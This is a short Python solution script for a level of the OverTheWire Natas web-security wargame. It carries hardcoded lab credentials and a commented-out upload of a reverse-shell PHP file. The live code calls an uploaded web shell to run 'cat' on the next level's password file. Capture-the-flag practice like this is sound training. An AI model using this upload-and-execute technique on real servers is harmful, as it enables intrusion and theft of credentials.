from bs4 import BeautifulSoup as bs
import urllib
import base64
import binascii
import requests
import re

u='natas13'
p='jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'
l=f'http://{u}.natas.labs.overthewire.org'
#resp=requests.post(l,data={'filename':'natas12_revshell.php','MAX_FILE_SIZE':'1000'},files={'uploadedfile':open('natas12_revshell.php','rb')},auth=(u, p))
command='cat /etc/natas_webpass/natas14'
resp=requests.post(l+'/upload/hfaknrs7si.php?c='+command,auth=(u, p))
print(resp.text)
